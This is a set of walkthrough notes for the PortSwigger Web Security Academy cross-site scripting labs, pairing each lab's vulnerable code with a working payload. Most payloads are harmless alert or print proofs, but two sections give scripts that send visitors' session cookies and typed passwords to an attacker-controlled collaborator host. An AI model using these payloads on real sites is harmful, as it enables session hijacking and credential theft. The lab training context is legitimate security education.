## Lab: Reflected XSS into HTML context with nothing encoded
```js
// We simply put this in the search bar:
<script>alert("text")</script>
```

## Lab: Stored XSS into HTML context with nothing encoded
```js
// The vulnerability if found in the comment box, so we can put the same script as before at comment time
<script>alert("text")</script>
```

## Lab: DOM XSS in document.write sink using source location.search
```js
// Looking at the code of the document.write function in the source code of the page:
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
// We can see how the img tag is not closed, so we can put more code in it:
"><svg onload=alert("text")>
// This way, it will print everything that we introduce on the screen. 
```

## Lab: DOM XSS in innerHTML sink using source location.search
```js
// The error is in the following function within the code:
function doSearchQuery(query) {
	document.getElementById('searchMessage').innerHTML = query;}
	var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
doSearchQuery(query)
;}
// Here it says: if the query is correct, search me for what the query asks for. 
//But what if it is incorrect? It does nothing for the else case. 
//Therefore, we can put any erroneous query, as for example an image, 
//but with the condition that if it gives error, that an alert() is sent to the screen:
<img src=1 onerror=alert(1)>
```

## Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
```js
// Looking at the source code of the page, we can see how the vulnerable part is this:
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
// What it does is to attribute to the href element whatever is passed to it by URL, 
//without controlling that input. Therefore, the solution to this lab is to add 
javascript:alert(document.cookie).
// after the "returnPath" in the URL of the web page.
```

## DOM XSS in jQuery selector sink using a hashchange event
```js
// The vulnerable code in the page is as follows:
  $(window).on('hashchange', function(){
      var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
       if (post) post.get(0).scrollIntoView();
// Especially the following action
.slice(1)
// Which is used to delete the position in N (which in this case is 1), which in our case is the #.
// Therefore, without the # element, we have control over any source that does not require it. 
// To solve this lab, we have to send the exploit to the victim using the exploit server of the lab and introducing the following query in the Body part:
<iframe src="https://0ad100cb03f5d10fc3545372018d0057.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
// Important to see that the # has been added to the end of the URL (because the .slice(1) function has deleted it) to redirect it to any place of our interest. 
```
## Reflected XSS into a JavaScript string with angle brackets HTML encoded
```js
//Anything we look for in the taskbar is stored in '', so we can escape it and raise an alert:
';alert(1)//
```

## DOM XSS in document.write sink using source location.search inside a select element
```js
//We are going to see what part of the back-end of the page awaits our interaction, and we see that it is this:
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
	if(stores[i] === store) {
        continue;
    }
//   document.write('<option>'+stores[i]+'</option>');}
//	document.write('</select>');}
//What the code does here is store the value of the query in the "store" variable, and later check its value in the if. 
//If the result is true (ie, the storeId exists), go into document.write and write the store+/option. 
//Therefore, we can inject a payload into the StoreId field, since //it is not sanitized. 
//Therefore, it is enough to add this code to the url:
&storeId=<script>alert(2)</script>
```
## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
```js
// As AngularJs scripts are executed using {{}}, we see that it is prone to SSTI type injections. 
//In addition to this, the ng-app attribute is used, so we put a payload in it with alert():
{{this.constructor.constructor('alert("lo_que_sea")')()}}}
// The way this works is simple:
// If we put a script in Angular as for example can be {{alert(1)}}, the Angular sandboxing will block it, therefore, 
//we need to escape from this sandbox somehow to be able to execute malicious code. 
//Therefore, since we are dealing with a vulnerable ng-app, we can use the attribute 
.constructor() // To "create" new code. 
```

## Reflected DOM XSS
```js
// Intercepted with burp on the HTTP History tab, we see that every response returns the searched parameter in Json format.
 //In addition to this, it is processed using the eval() function, so try to escape this search:
\" -alert(1)}///
```

## Stored DOM XSS
```js
// By posting a comment and looking up the request in burp's HTTP History, we can see how the file is called
loadCommentsWithVulnerableEscapeHtml.js // So let's inspect it:
// Looking at its source code, we are going to look for .innerHTML elements (knowing that it is a DOM), 
//and we find the following function:
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
// Which replaces the <>. However, when the first argument is a string, 
//it simply replaces the first <> found, leaving the rest untouched, so we can put a payload like this in it:
<><img src=1 onerror=alert(1)>
// This way, only the <> at the beginning will be html-encoded.
```

## Exploiting cross-site scripting to steal cookies
```js
// Since the victim user will see any comment posted, we need to create a comment that
//will remove the cookie and send it to us (via the burp collaborator).
// We create a script that we will introduce to the comment field:
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { // fetch in this case is interpreted as "send me to this URL"
method: 'POST', // We use POST method to upload the comment
mode: 'no-cors', // We do not access the body of the page that we fetch, but we introduce our own.
body:document.cookie // We just remove the cookie from it
});
</script>
// This script will make anyone viewing the comment create a post with their session cookie (which will be redirected to our burp server).
// We do Poll-now in the collaborator and we already have the cookie of the victim
```

## Exploiting cross-site scripting to capture passwords
```js
<input name=username id=username>
<input type=password name=password onchange="fetch('https://target',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

//This script works as follows: As

//With this script, we manage to send the user and password fields (when this is changed) 
// to our burp collaborator server whenever a person sees our post.
// It can also be done using XMLHttpRequest:
<input name=username id=username>
<input type=password name=password id=password onchange="Capture()">
<script>
function Capture()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://destination.com/?username=" + user + "&password=" + pass, true)
xhr. send();
}
</script>
```
## Reflected XSS into HTML context with most tags and attributes blocked
```js
// We intercept a search request with Burp, we kill it to the repeater and we put <test> inside the search field, 
//where test will be the field to brute-force in search of the tags that by-pass the WAF. 
//We find that body is a valid tag. Now it's time to look for an event to inject the print() command.
// Then we add <body%20a=> to the search field of the intruder, where 'a' will be the field to brute-force in the event search. 
//We see that onresize is a valid event with the body tag, so we are going to create an exploit that we will send to the victim:
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=<body onresize=print()>" onload=this.style.width='100px'> 
// We have to add "onload" so that the "onresize" event is activated when the page of the <iframe> is loaded
//URL ENCODE:
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

## Reflected XSS into HTML context with all tags blocked except custom ones
```js
// We simply create a custom tag, which we url-encode and send to the victim:
<script>
location = "https://0a4d002603441d94c0abdd07003f008e.web-security-academy.net/?search=/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x"
</script>
// We use location to redirect to a URL of our interest.
```

## Reflected XSS with some SVG markup allowed
```js
// First, let's see the tags that can be used (using the intruder). It reports us:
<svg>,<animatetransform>, <title> and <image>
// Now it's time to brute-force the event. And we see that we only have one valid: onbegin
// In this way, searching a bit for portswigger's XSS cheatsheet payload we find this:
<svg><animatetransform onbegin=alert(1) attributeName=transform>
// Which allows us to solve the lab.
```

## Reflected XSS in canonical link tag
```js
// If we look at the source code of the page in its home section, we can see how it has a
<link rel="canonical"> // When we see this tag in a link, it means that it is a duplicate of the specified URL.
// Also, these tags have an attribute called "accesskey" which works is called when we press the short cut that we defined in it.
// Therefore, we can code this attribute directly into the page URL as follows:

https://0ace00c7037fef83c0b9457e002e00cb.web-security-academy.net/?'accesskey='x'onclick='alert(1)
//URL encoded:
https://0ace00c7037fef83c0b9457e002e00cb.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

// By injecting this command, using the shortcut we output a reflected XSS to the screen.
```

## Reflected XSS into a JavaScript string with single quote and backslash escaped
```js
// Putting any input in the search bar, we see that it is saved in the following way in the back-end of the page:
var searchTerms = 'test';
// If we try to put a string with a ' at the end to close the string, it returns this:
var searchTerms = 'test\'payload'; // puts the \ to prevent us from going outside the current string.
//However, we are going to try to close tags if we put the corresponding syntax. Which if he lets us do.
// So, we can close the javascript we're in by just putting </script> in the search bar 
//and then declaring our own script to output an alert(1) per screen, so the syntax for solve the lab would be this:
</script><script>alert("whatever")</script>
```
## Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
```js
// We see that our input from the website field (which is the one we are interested in infecting) 
//is stored within an <onclick> tag, so it will be executed when clicked.
// Introducing for example this input:
http://foo?&apos;test
// We see that it is saved like this:
href="http://foo?&apos;test" onclick="var tracker={track(){}};tracker.track('http://foo?&apos;test');">admin</a > /// (&apos is in a different color, so it is //interpreted as an endity, so we can use it to escape the current script and enter code of our choice. In this case, an alert()).
// &apos is the url-encoded version of the single quote ('), but we have to put it this way because the url-uncodes the browser whatever is passed to the <onclick> tag //before the JavaScript itself is parsed

// So, since we know we can by-pass the script using &apos; let's inject an alert:
http://what_k_sea?&apos;-alert("whatever_sea")-&apos;
```

## Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
```js
// If we search for anything in the search bar, we can see how it is stored in a template literal string on the backend:
var message = `0 search results for 'our_input'`;
// As data, the javascript templates allow the execution of expressions inside them (that is, if we put an alert between the ``, 
//it will be displayed on the screen)
// So we just have to embed an alert(1) inside, and we do this by putting this in the search bar:
${alert(1)}
```

## Reflected XSS with event handlers and href attributes blocked
```js
// Investigating through google we see a post from PortSwigger explaining more or less how to do this lab:
https://portswigger.net/research/svg-animate-xss-vector
// In it, we can see that it creates an alternative to href, but using <svg> and its "animate" event. However, 
//your code contains words blocked by our WAF, so you have to look for an alternative:
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
// Let's explain the code in parts:
<svg> // To indicate that we are dealing with an svg, obviously
<a></a> /// To indicate that we will create a hyperlink
<animate attributeName> // We indicate the name of the CSS property or attribute ("text in our case") 
//of the target element that is going to be changed during an animation (that's why we use animate). 
//In addition, we have to put =href, since it is the attribute that we are interested in using for redirects
href values=javascript:alert(1) // What will happen when we click.
<text x=20 y=20>Click me</text> /// We simply define the appearance of the "Click Me" text. 
//In order to give it shape, we use the <text></text> tags as they are the ones that the page allows us to do.
```
